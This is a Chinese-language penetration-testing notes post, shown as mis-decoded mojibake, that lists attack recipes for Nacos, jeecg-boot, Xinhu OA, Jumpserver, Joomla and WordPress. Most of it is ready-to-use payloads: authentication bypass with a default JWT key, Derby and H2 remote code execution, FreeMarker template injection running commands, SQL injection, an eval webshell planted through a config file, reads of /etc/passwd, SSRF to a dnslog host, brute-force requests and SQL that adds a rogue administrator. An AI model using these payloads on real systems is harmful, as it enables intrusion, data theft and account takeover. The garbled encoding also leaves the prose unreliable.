---

title: æ¸—é€ä¸­å¸¸è§åº”ç”¨è®°å½•
date: 2023/8/3 19:46:25
categories:
- æ¸—é€æµ‹è¯•
tags:
- æ¸—é€æ€è·¯
---

# Webåº”ç”¨

|    CMS    |    é˜¿é‡Œç³»     |   JAVA    |  å›½å†…è½¯ä»¶  |       æ•°æ®åº“       |     API     |   äº‘ç›¸å…³   |
| :-------: | :-----------: | :-------: | :--------: | :----------------: | :---------: | :--------: |
|  Laravel  | druid monitor | fastjson  |    ç•…æ·    |     å¸¸è§æ•°æ®åº“     |  Wsdlæ¥å£   |    OSS     |
| ThinkPHP  |     Nacos     |   log4j   |  æµ·åº·å¨è§†  |       Redis        | Swaggeræ¥å£ | dockeré€ƒé€¸ |
|  Drupal   |  hessianç»„ä»¶  | Thymeleaf |   å„ç§OA   |         ES         |   Webpack   |   Minio    |
|  DeadCMS  |               | Weblogic  |    H3C     | MQTTï¼ˆç‰©è”ç½‘åè®®ï¼‰ |   GraphQL   |   Harbor   |
| Wordpress |               |   shiro   | é‡‘è¶äº‘æ˜Ÿç©º |                    |             |  Rancher   |
|  Joomla   |               |  spring   | jeecg-boot |                    |             |            |
|           |               |   JBOSS   |    è‹¥ä¾    |                    |             |            |
|           |               |           |    å¸†è½¯    |                    |             |            |
|           |               |           |  phpstudy  |                    |             |            |



### æ³›å¾®

æ³›å¾®äº‘æ¡¥

![image-20240428173030211](../../../images/image-20240428173030211.png)

https://mp.weixin.qq.com/s/BwJJPf5S-SKzChuDGl9i5w



æ³›å¾®







### Nacos

> ä¸€ä¸ªæ˜“äºä½¿ç”¨çš„åŠ¨æ€æœåŠ¡å‘ç°ã€é…ç½®å’ŒæœåŠ¡ç®¡ç†å¹³å°ï¼Œç”¨äºæ„å»ºäº‘åŸç”Ÿåº”ç”¨ç¨‹åºã€‚

é»˜è®¤å¼€æ”¾åœ¨åœ¨8848ç«¯å£+/nacosï¼Œé»˜è®¤å£ä»¤nacos/nacos

![image-20231014100945576](../../../images/image-20231014100945576.png)

- RCE

  [Nacosç»“åˆSpring Cloud Gateway RCEåˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)](https://xz.aliyun.com/t/11493#toc-0)

  [c0olw/NacosRce: Nacos JRaft Hessian ååºåˆ—åŒ– RCE åŠ è½½å­—èŠ‚ç  æ³¨å…¥å†…å­˜é©¬ ä¸å‡ºç½‘åˆ©ç”¨ (github.com)](https://github.com/c0olw/NacosRce)

- é‰´æƒç›¸å…³

  ç›¸å…³æ¥å£

  ```bash
  ç”¨æˆ·æŸ¥çœ‹ 
  /nacos/v1/auth/users?pageNo=1&pageSize=2&search=blur
  
  ç”¨æˆ·æ³¨å†Œ 
  /nacos/v1/auth/users  POSTï¼šusername=crow&password=crow&search=blur
  /nacos/v1/auth/users?username=crow&password=crow&search=blur
  
  é…ç½®ä¿¡æ¯ç›¸å…³
  /nacos/v1/console/namespaces # æŸ¥çœ‹å‘½åç©ºé—´ 
  /v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99 # æŸ¥çœ‹pubilcé…ç½®
  /nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99&tenant=namespace
  # æŸ¥çœ‹æŒ‡å®šå‘½åç©ºé—´é…ç½®
  nacos/v1/cs/configs?export=true&tenant=namespace&group=&appName=&ids= # å¯¼å‡ºæŒ‡å®šå‘½åç©ºé—´é…ç½®
  ```

  æƒé™ç»•è¿‡

  ```bash
  -User-Agent: Nacos-Serverï¼ˆä½ç‰ˆæœ¬ç›´æ¥è®¿é—®urlï¼Œ1.2~1.4å¯ä»¥å°è¯•æ·»åŠ UAå¤´æ¥ç»•è¿‡é‰´æƒï¼‰
  
  -serverIdentity: securityï¼ˆnacoså¼€å¯æƒé™è®¤è¯çš„é»˜è®¤å€¼ï¼‰
  -example:example
  -test:test
  
  Nacos é»˜è®¤ secret.key é…ç½®ä¸å½“æƒé™ç»•è¿‡æ¼æ´ï¼ˆCNVD-2023674205ï¼‰
  -Nacos <= 2.2.0
  -åˆ©ç”¨é»˜è®¤secret.keyç”ŸæˆJWT Tokenï¼Œä»è€Œé€ æˆæƒé™ç»•è¿‡è®¿é—®åˆ°ç›¸å…³APIæ¥å£
  -/nacos/v1/auth/users?pageNo=1&pageSize=2&accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc5OTMxODM3OH0.jR1idVKGeickN20hffQzb80Yp2qQx5m8ApKf5BeR05g  ï¼ˆç”Ÿæˆçš„2027å¹´è¿‡æœŸçš„ï¼‰
  -æˆ–è€…/nacos/v1/auth/users?pageNo=1&pageSize=2 æ·»åŠ Authorization: Bearer JWT 
  ```

  nacosä½¿ç”¨å¤–ç½®derbyæ•°æ®åº“æ²¡æœ‰é‰´æƒå¯¼è‡´çš„ä»»æ„selectæŸ¥è¯¢æ“ä½œ

  ```bash
  /nacos/v1/cs/ops/derby?sql=select * from sys.systables # æ‰€æœ‰è¡¨
  /nacos/v1/cs/ops/derby?sql=select * from CONFIG_INFO # å½“å‰é…ç½®
  /nacos/v1/cs/ops/derby?sql=select * from HIS_CONFIG_INFO # å†å²é…ç½®
  /nacos/v1/cs/ops/derby?sql=select * from users # ç”¨æˆ·
  # bypass
  /nacos/v1/cs/ops/derby?sql=SELECT--/dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad&sql=/%0a*--/%25&q=dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad%&sql=%0afrom--/&sql=/%0ausers
  
  
  derbyæ•°æ®åº“å¦‚ä½•å®ç°RCE - lvyyevd's å®‰å…¨åšå®¢
  http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce
  ```

- å¯†ç è§£å¯†

  ```bash
  nacosä½¿ç”¨çš„åŠ å¯†æ–¹å¼ä¸ºBcryptåŠ å¯†ï¼Œç ´è§£å°å·¥å…·https://link.zhihu.com/?target=https%3A//gitee.com/mzq-123/picture/raw/master/Bcrypt/BCrypt-de.jar
  ```

- å·¥å…·

  [pap1rman/postnacos: å“¥æ–¯æ‹‰nacosåæ¸—é€æ’ä»¶ maketoken adduser (github.com)](https://github.com/pap1rman/postnacos)

  [charonlight/NacosExploitGUI: Nacosç»¼åˆæ¼æ´åˆ©ç”¨GUIå·¥å…·ï¼Œé›†æˆäº†é»˜è®¤å£ä»¤æ¼æ´ã€SQLæ³¨å…¥æ¼æ´ã€èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´ã€ååºåˆ—åŒ–æ¼æ´çš„æ£€æµ‹åŠå…¶åˆ©ç”¨ (github.com)](https://github.com/charonlight/NacosExploitGUI)

Nacos derby Rce

- æ¡ä»¶

  ```
  Nacosç‰ˆæœ¬2.3.2æˆ–è€…2.4.0ç­‰
  èƒ½è®¿é—®removalå’Œderbyæ¥å£ï¼ˆæƒé™é—®é¢˜ï¼‰
  ```

- expåˆ©ç”¨

  > VPSèµ·æ¶æ„ç±»ï¼Œåˆ©ç”¨removalæ¥å£åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œæœ€ååˆ©ç”¨derbyæ¥å£æ‰§è¡Œsqlè¯­å¥ï¼ˆæ‰§è¡Œè‡ªå®šä¹‰å‡½æ•°ï¼‰
  >
  > **removalæ¥å£ä¼šéå†å¹¶æ‰§è¡Œç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶çš„æ¯ä¸€è¡Œï¼Œè¿™é‡Œç›¸å½“äºç»™äº†ä¸¤ä¸ªæ¡ä»¶ï¼š 1. å¯ä»¥æ‰§è¡Œä»»æ„SQLè¯­å¥ 2. å¯ä»¥æ‰§è¡Œå¤šä¸ªSQLè¯­å¥**
  >
  > **ä¿®æ”¹æ¶æ„ç±»å†…å®¹æ¥æ‰§è¡Œç›¸å…³æ“ä½œ**

  ```sql
  # è°ƒç”¨sqlj.install_jaræ–¹æ³•å®‰è£…ä¸€ä¸ªjaråŒ…
  CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)\n
  # è°ƒç”¨SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTYæ–¹æ³•è®¾ç½®æ•°æ®åº“å±æ€§,derby.database.classpathå®šä¹‰äº†æ•°æ®åº“çš„ç±»è·¯å¾„ï¼Œå³å¯ä»¥åœ¨æ•°æ®åº“ä¸­è°ƒç”¨jaråŒ…ä¸­çš„æ–¹æ³•
  CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.{id}')\n
  # åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°
  CREATE FUNCTION S_EXAMPLE_1(PARAM VARCHAR(2000))
  RETURNS VARCHAR(2000) # è¿”å›æœ€å¤š 2000 ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²
  PARAMETER STYLE JAVA 
  NO SQL
  LANGUAGE JAVA
  EXTERNAL NAME 'test.poc.Example.exec' # æŒ‡å®šäº†å®ç°è¯¥å‡½æ•°çš„å¤–éƒ¨ Java æ–¹æ³•çš„å®Œå…¨é™å®šåï¼Œtest.poc åŒ…ä¸­çš„ Example ç±»çš„ exec æ–¹æ³•
  # è°ƒç”¨è‡ªå®šä¹‰å‡½æ•°
  SELECT S_EXAMPLE_1('ä¼ å‚')
  ```

Nacos Jraft Hessianååºåˆ—åŒ–

https://mp.weixin.qq.com/s/0J0K0iY3bcmYcOuPGymAlQ

- 1.4.1 <= Nacos < 1.4.6 ä½¿ç”¨clusteré›†ç¾¤æ¨¡å¼è¿è¡Œ

- 1.4.0ã€2.0.0 <= Nacos < 2.2.3 ä»»æ„æ¨¡å¼å¯åŠ¨å‡å—åˆ°å½±å“

â€‹	



### Alibaba druid monitor

> ##### **Druidæ˜¯é˜¿é‡Œå·´å·´æ•°æ®åº“äº‹ä¸šéƒ¨å‡ºå“ï¼Œä¸ºç›‘æ§è€Œç”Ÿçš„æ•°æ®åº“è¿æ¥æ± **
>
> ##### ç›‘æ§SQLçš„æ‰§è¡Œæ—¶é—´ã€ç›‘æ§Web URIçš„è¯·æ±‚ã€Sessionç›‘æ§.
>
> ![image-20230714210240219](../../../images/image-20230714210240219.png)

```php
æœªæˆæƒè®¿é—®è·¯å¾„ï¼š 
/druid/index.html
/druid/websession.html
/druid/weburi.html
/druid/basic.json 
/druid/websession.json
/druid/weburi.json
    
éœ€è¦ç™»é™†çš„è¯ï¼Œç™»å½•å…¥å£è·¯å¾„ï¼š
/druid/login.html

åˆ©ç”¨å§¿åŠ¿ï¼š
Sessionç›‘æ§è·å–ç”¨æˆ·èº«ä»½ï¼ˆsessionå¯èƒ½æ˜¯è¿‡æœŸçš„æ— ç”¨ï¼Œéœ€è¦çˆ†ç ´éªŒè¯;ç½‘ç«™ä¸ä½¿ç”¨sessionæ¥è¿›è¡Œé‰´æƒï¼Œæ‰€ä»¥æ— ç”¨ï¼‰
URIè·å–åå°è·¯å¾„ï¼šæµ‹è¯•æœªæˆæƒè®¿é—®ï¼Œæˆ–è€…é…åˆsessionè¿›è¡Œåå°æ“ä½œ
```



### Jumpserver

```bash
/api/v1/terminal/sessions/ # è·å–æ•æ„Ÿä¿¡æ¯å½•åƒ
/api/v1/ops/playbook/e0adabef-c38f-492d-bd92-832bacc3df5f/file/?key=../../../../../../../etc/passwd # ç™»å½•åæ‰èƒ½ä½¿ç”¨
```



### jeecg-boot

![image-20230921214423085](../../../images/image-20230921214423085.png)

- ç»„ä»¶

  ```bash
  /jeecg-boot/druid/index.html # admin/123456
  /jeecg-boot/actuator  # ä¸€èˆ¬å­˜åœ¨httptraceç«¯ç‚¹
  /jeecg-boot/doc.htmlï¼Œ/jeecg-boot/swagger-ui.html #Basicè®¤è¯ jeecg/jeecg1314
  /jeecg-boot/v2/api-docs
  
  rabitmq http://localhost:15672	guest/guest	
  nacosï¼ˆæœåŠ¡æ³¨å†Œå‘ç°å’Œç»Ÿä¸€é…ç½®ä¸­å¿ƒï¼‰http://localhost:8848/nacos	nacos/nacos	
  xxl-job-adminï¼ˆåˆ†å¸ƒå¼å®šæ—¶ä»»åŠ¡ï¼‰	http://localhost:9080/xxl-job-admin	admin/123456	
  redis ï¼ˆç¼“å­˜ï¼‰	127.0.0.1:6379	å¯†ç ç©º
  ```

- ç›¸å…³æ¥å£

  ```
  GET /jeecg-boot/sys/user/exportXls # å¯¼å‡ºç”¨æˆ·
  GET /jeecg-boot/sys/user/list # æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨
  GET /jeecg-boot/sxams/mysqlbackup/list # æŸ¥çœ‹æ•°æ®åº“å¤‡ä»½
  GET /jeecg-boot/sys/sysAnnouncementSend/getMyAnnouncementSend # æ¶ˆæ¯é€šçŸ¥
  GET /jeecg-boot/sys/dataSource/list #è·å–æ•°æ®åº“ç›¸å…³ä¿¡æ¯
  
  # ä¿®æ”¹å¯†ç 
  PUT /jeecg-boot/sys/user/changePassword
  Content-Type: application/json
  {"username":"1231222","password":"Qwer1234!","confirmpassword":"Qwer1234!"}
  ```

- æœªæˆæƒæŸ¥è¯¢ï¼ˆå¯ä»¥æŸ¥è¯¢åˆ°ç”¨æˆ·åå’Œç”µè¯å·ç ï¼‰

  ```
  /jeecg-boot/sys/user/querySysUser?username=admin
  ```

- æœªæˆæƒsqlæ³¨å…¥ï¼ˆæŠ¥é”™æ³¨å…¥ï¼‰

  ```
  POST /jeecg-boot/jmreport/qurestSql
  
  {"apiSelectId":"1316997232402231298","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}
  ```

- SSTIæ³¨å…¥

  ```http
  POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
  Host: 192.168.90.1:3100
  Origin: http://192.168.90.1:3100
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
  Accept: */*
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Connection: close
  Content-Type: application/json
  Content-Length: 123
  
  {"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"open -a calculator.app  \") }' "}
  ```

- JDBC

  ```http
  POST /jeecgboot/jmreport/testConnection HTTP/1.1
  Host: 192.168.90.1:3100
  Content-Length: 383
  Accept: application/json, text/plain, */*
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
  Content-Type: application/json;charset=UTF-8
  Origin: http://192.168.90.1:3100
  Referer: http://192.168.90.1:3100/login?redirect=/dashboard/analysis
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Connection: close
  
  {
    "id": "1",
    "code": "dataSource1",
    "dbType": "H2",
    "dbDriver": "org.h2.Driver",
    "dbUrl": "jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('open -a calculator.app')\u000A$$",
    "dbName": "test",
    "dbUsername": "sa",
    "dbPassword": "",
    "connectTimes": 5
  }
  ```

- æ–‡ä»¶è¯»å–

  ```http
  POST /fzsubway/jmreport/testConnection HTTP/1.1
  Host: xxx
  Cache-Control: max-age=0
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Cookie: JSESSIONID=38218C16E4022462F885161A2E0C4CCB; AntiLeech=2682583728; SECKEY_ABVK=z1hNWlXhJNRMfOWBcwIZZqelCyMfKElivU/svwCZzjo%3D; BMAP_SECKEY=2__IGYvkyC_isfYhAQNJUfG9ZmlOSJqO86jO158B6xt7DpDdl8vU_XEcAj1by2qFkzxQFvskvrzECqqBlu9Bp-PaZ6EPwYr595XK1qAjEYPDz8cu5m5ae-DSxRqaD1mP0lkcfUAFG7-lY-IRd3zSq0Oir1xRhOafcZ76YwQT0CqsHHw1iW-kvMhXjHvOhZId; JSESSIONID=2D86CE0B3842FC0E36528E7EFD223D1E
  Connection: close
  Content-Type: application/json
  Content-Length: 350
  
  {
      "id":"1",
      "code":"select * from information_schema.tables",
      "dbType":"jndi",
      "dbDriver":"com.mysql.cj.jdbc.Driver",
      "dbUrl":"jdbc:mysql://localhost:3307/test?allowLoadLocalInfile=yes",
      "dbName":"information_schema",
      "dbUsername":"fileread_/etc/passwd",
      "dbPassword":"password",
      "connectionTimaes":"5"
  }
  ```

  

### ä¿¡å‘¼OA

- åå°æ–‡ä»¶ä¸Šä¼ 

  ![image-20230901104539733](../../../images/image-20230901104539733.png)

  ![image-20230901104908007](../../../images/image-20230901104908007.png)

  è¿˜åŸæ–‡ä»¶

  ```http
  GET /task.php?m=qcloudCos|runt&a=run&fileid=19
  ```

  ![image-20230901104840680](../../../images/image-20230901104840680.png)

- åå°é…ç½®æ–‡ä»¶getshell

  ```php
  /index.php?a=changestyle&m=geren&d=system&ajaxbool=true&style=21,id=1,name=0x610A6576616C28245F504F53545B315D293B2F2F
  ```

  é‡æ–°ç™»é™†

  ```php
  /index.php?a=savecong&m=cog&d=system&ajaxbool=true&rnd=705961
  ```

  ![image-20230901110753588](../../../images/image-20230901110753588.png)

  ä»£ç æ‰§è¡Œ

  ```php
  POST /index.php
      
  1=phpinfo();
  ```

  ![image-20230901104430670](../../../images/image-20230901104430670.png)

  æ³¨æ„ï¼šç”¨äº†è¿™ä¸ªåå°ä¸»é¡µä¼šå‡ºç°é—®é¢˜

- åå°SSRF

  ä¿å­˜è¯·æ±‚

  ```http
  POST /index.php?a=setsave&m=xinhu&d=main&ajaxbool=true HTTP/1.1
  
  host=http://onj888.dnslog.cn
  ```

  å‘é€è¯·æ±‚

  ```http
  GET /index.php?a=testsends&m=xinhu&d=main&ajaxbool=true HTTP/1.1
  ```

- å‰å°å­˜å‚¨å‹XSSæ¼æ´

  ```http
  POST /?m=login&a=getoption&ajaxbool=true&num=aaaa\ HTTP/1.1
  Client-ip:111',web=0x3C7363726970743E616C65727428787373293C2F7363726970743E	--	
  ```

  > web= [XSSä»£ç çš„hexç¼–ç ]+[(tabé”®)--(tabé”®)]

  æŸ¥çœ‹æ—¥å¿—å¤„è§¦å‘xssä»£ç 





### Joomla

åå°

```
/administrator
```

æ¼æ´

CVE-2023-23752 POC Joomla! æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´

```
/api/index.php/v1/config/application?public=true
/api/v1/config/application?public=true
```

ã€æ¼æ´å¤ç° CVE-2021-23132ã€‘Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ - StarCi - åšå®¢å›­
https://www.cnblogs.com/starci/p/15174896.html

Exploit Database Search
https://www.exploit-db.com/search?q=joomla

ã€æ¼æ´åˆ†æã€‘CVE-2017-14596ï¼šJoomla! LDAPæ³¨å…¥å¯¼è‡´ç™»å½•è®¤è¯ç»•è¿‡æ¼æ´ï¼ˆå«æ¼”ç¤ºè§†é¢‘ï¼‰-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°
https://www.anquanke.com/post/id/86899





### Drupal

ç‰ˆæœ¬å·

```
/install.php
```

```
X-Generator: Drupal 8 (https://www.drupal.org)
/core/CHANGELOG.txt
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
```





### Wordpress

- ç›®å½•éå†

  ```
  /wp-content/uploads
  ```

- æ‰¾æ’ä»¶æ¼æ´

  ```
  /wp-content/plugins/wp-automatic/downloader.php?link=file:///var/www/podwoskizbryantb9_gmail.com.1305.w1261/site49107/wp-content/uploads/2020/01/index.php
  ```

- æ‰«å¤‡ä»½æ–‡ä»¶/éª‘é©¬

- å…³é”®æ–‡ä»¶

  ```
  wp-config.phpï¼šæ•°æ®åº“è¿æ¥
  ```



#### xmlrpcæ¼æ´

- çˆ†ç ´è´¦å¯†
- çˆ†ç ´ç«¯å£

WordPress <= 6.2  [WordPress xmlrpc.php æ¼æ´åˆ©ç”¨ - ç®€ä¹¦ (jianshu.com)](https://www.jianshu.com/p/42e3b065ad76)

> æ²¡å•¥ç”¨ï¼Œæˆ‘åªèƒ½æ”¶åˆ°dnslog



#### åå°getshell

æŠ€æœ¯è®¨è®º | WordPressåå°æ‹¿Shellæ–°å§¿æ€
https://mp.weixin.qq.com/s/SHO8FcH4Oz80BkgG-K8ULg

è¡¥å……ï¼šæ’ä»¶å¸‚åœºç›´æ¥å®‰è£…æœ‰æ¼æ´çš„æ’ä»¶

- åª’ä½“-æ–°å¢æ¡£æ¡ˆï¼ˆä½ç‰ˆæœ¬ï¼‰

- ä¿®æ”¹ä¸»é¢˜/æ’ä»¶æ¨¡æ¿æ–‡ä»¶

- ä¸Šä¼ æ–°ä¸»é¢˜å‹ç¼©åŒ…/æ–°æ’ä»¶å‹ç¼©åŒ…ï¼ˆæ’ä»¶å¯ä»¥ç›´æ¥ä¼ phpæ–‡ä»¶ï¼‰

  ```php
  # å³ä½¿æ˜¾ç¤ºPCLZIP_ERR_BAD_FORMAT (-10) : Unable to find End of Central Dir Record signatureæˆ–è€…è§£å‹ç›®å½•æ— æƒé™
  /wp-content/uploads ï¼ˆç›®å½•éå†ï¼‰
  ```

  ```php
  # æ­£å¸¸ä¸Šä¼ 
  /wp-content/upgrade/ä¸»é¢˜
  /wp-content/plugins/æ’ä»¶
  ```

  ```php
  # webshell
  /wp-content/themes/twentytwentythree/patterns/config.php
  ```

- æ’ä»¶å¸‚åœºå®‰è£…æœ‰æ¼æ´çš„æ’ä»¶



#### wpscan

```cmd
docker pull wpscanteam/wpscan
docker run -it --rm wpscanteam/wpscan --url https://target.tld/ --enumerate u
```



#### å¯†ç é‡ç½®æ“ä½œ

> å“¥æ–¯æ‹‰çš„æ•°æ®åº“åªèƒ½æ‰§è¡ŒæŸ¥è¯¢æ“ä½œ
>
> å†°èçš„æ•°æ®åº“è¦è‡ªå·±è¿›è¡Œsqlæ“ä½œ

```sql
select * from wp_users limit 0,20
update wp_users set user_pass=md5("test")  where user_login="oY_Zb5ADu0lV2QM0KarP6y6MrLus"
```

æ–°å¢ç®¡ç†å‘˜

```mysql
-- æ’å…¥æ–°ç”¨æˆ·è®°å½•åˆ° wp_users è¡¨
INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status, display_name)
VALUES ('admin', MD5('123456'), 'admin@example.com', NOW(), 0, 'admin');

-- è·å–æ–°ç”¨æˆ·çš„ ID
SET @user_id = LAST_INSERT_ID();

-- æ’å…¥æ–°ç”¨æˆ·è§’è‰²åˆ° wp_usermeta è¡¨
INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (@user_id, 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}'),
       (@user_id, 'wp_user_level', '10');
```





#### å¦‚ä½•æ‰¾åˆ°wordpressç‰ˆæœ¬

```
https://target.com/feed 
https://target.com/?feed=rss2
```

```
ctrl+F generator
```

#### å¦‚ä½•æ‰¾åˆ°æ’ä»¶ç‰ˆæœ¬

```
https://target.com/wp-content/plugins/PLUGINNAME/readme.txt
https://target.com/wp-content/plugins/PLUGINNAME/readme.TXT
https://target.com/wp-content/plugins/PLUGINNAME/README.txt
https://target.com/wp-content/plugins/PLUGINNAME/README.TXT
```

#### å¦‚ä½•æ‰¾åˆ°ä¸»é¢˜ç‰ˆæœ¬

```
https://target.com/wp-content/themes/THEMENAME/style.css 
https://target.com/wp-content/themes/THEMENAME/readme.txt (If they have readme file)
```

å¦‚æœæ‚¨å‘ç°è¿‡æ—¶çš„æ ¸å¿ƒ/æ’ä»¶/ä¸»é¢˜ï¼Œè¯·åœ¨https://wpscan.comæ‰¾åˆ°æ¼æ´åˆ©ç”¨

#### æŸ¥æ‰¾æ—¥å¿—æ–‡ä»¶

```
http://target.com/wp-content/debug.log
```

#### è·å–ç½‘ç«™ä¸Šçš„ç”¨æˆ·å

```
http://target.com/?author=1
```

æˆ–è€…

```
http://target.com/wp-json/wp/v2/users 
http://target.com/?rest_route=/wp/v2/users
```

#### çˆ†ç ´åå°è´¦å·å¯†ç 

```
POST /wp-login.php HTTP/1.1
Host: target.com

log=admin&pwd=BRUTEFORCE_IN_HERE&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget.com%2Fwp-admin%2F&testcookie=1
```

æˆ–è€…

```
POST /xmlrpc.php HTTP/1.1
Host: target.com

<?xml version="1.0" encoding="UTF-8"?><methodCall> <methodName>wp.getUsersBlogs</methodName> <params> <param><value>admin</value></param> <param><value>BRUTEFORCE_IN_HERE</value></param> </params> </methodCall>
```

#### çˆ†ç ´ç«¯å£

```
POST /xmlrpc.php HTTP/1.1
Host: target.com

<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://yourip:port</string></value></param><param><value><string>https://target.com></string></value></param></params></methodCall>
```

#### æ³¨å†Œå¯ç”¨

```
http://example.com/wp-login.php?action=register
```



#### /wp-json/oembed/1.0/proxy - SSRF

å°è¯•è®¿é—®https://xxxxxxxx.com/wp-json/oembed/1.0/proxy? url= xxxxxxxxxxxxå’ŒWorpressâ½¹ç«™å¯èƒ½ ä¼šå‘æ‚¨æå‡ºè¯·æ±‚ã€‚



#### /wp-json ç«¯ç‚¹æš´éœ²æ¥â¼â½‚æ¡£

è®¿é—®https://www.xxxx.com/wp-jsonç«¯â¼ä¼šè·å¾—æœ‰å…³â½¹ç«™restapiçš„æ¥â¼åˆ—è¡¨ã€‚

![image-20241014211010476](\blog\source\images\image-20241014211010476.png)

è¿™ä¸ªnamespcaseåº”è¯¥å’Œæ’ä»¶åæœ‰å…³ï¼Œæ­£å¸¸æ¥è¯´æ˜¯å…¬å¼€æš´éœ²çš„ç«¯ç‚¹ï¼Œä½†æ˜¯â¼€èˆ¬ä¼šä»¥æ’ä»¶åç§°ä½œä¸ºå‘½åç©ºé—´ï¼Œâ½å¦‚/wp-json/myplugin/v1/ï¼Œå†ç»“åˆwpscanæ‰«æçš„ç»“æœï¼Œæˆ‘ä»¬å¯ä»¥é’ˆå¯¹æ’ä»¶çš„å†å²æ¼æ´è¿›â¾æ’æŸ¥ã€‚ é’ˆå¯¹æ’ä»¶æœ‰ä¸¤ä¸ªè¦æ£€æŸ¥çš„ï¼š 1. é€šâ½¤æ’ä»¶çš„å†å²æ¼æ´ 2. â¾ƒå®šä¹‰æ’ä»¶çš„æ¥â¼ å› æ­¤åœ¨æµ‹è¯•çš„æ—¶å€™å…ˆæ ¹æ®wpscanæµ‹â¼€éæ’ä»¶å†å²æ¼æ´ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™å»æ’æŸ¥å“ªäº›å‘½åç©ºé—´ä¸åŒ…å«åœ¨é€šâ½¤æ’ä»¶å†…ï¼Œé‚£ä¹ˆè¿™ äº›æ’ä»¶å¯èƒ½æ˜¯â¾ƒå®šä¹‰çš„æ’ä»¶ï¼Œé‚£ä¹ˆå†å»â¼€ä¸ªä¸ªæ ¹æ®æ¥â¼æ ¼å¼å»æµ‹è¯•æ¥â¼ã€‚å½“â¾ƒå®šä¹‰æ’ä»¶çš„æ¥â¼æµ‹è¯•å®Œäº†è¿˜æ˜¯æ²¡æœ‰æ¼æ´ï¼Œ åˆ™å†çœ‹çœ‹é€šâ½¤æ’ä»¶çš„æ¥â¼æ˜¯å¦æœ‰â¼†æ¬¡å¼€å‘ä¹‹ç±»çš„ã€‚



### Spring

- actuatorç«¯ç‚¹
- swaggeræ¥å£
- rce
- æƒé™ç»•è¿‡



### Apache Druid

kafaraååºåˆ—åŒ–

![image-20230624162154282](../../../images/image-20230624162154282.png)



### Redis

[Redisæ¼æ´ | Khaz's Blog (fgtbnc.github.io)](https://fgtbnc.github.io/2023/05/01/Redisæ¼æ´/)



### VUE

ä¸»è¦æ˜¯æ¥å£æµ‹è¯•

- go-vue-admin

  [Gin-Vue-adminå‚ç›´è¶Šæƒæ¼æ´ä¸ä»£ç åˆ†æ-CVE-2022-21660 - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·](https://www.freebuf.com/articles/network/319175.html)

  ![image-20230828171702219](../../../images/image-20230828171702219.png)

  ![image-20230828171740088](../../../images/image-20230828171740088.png)

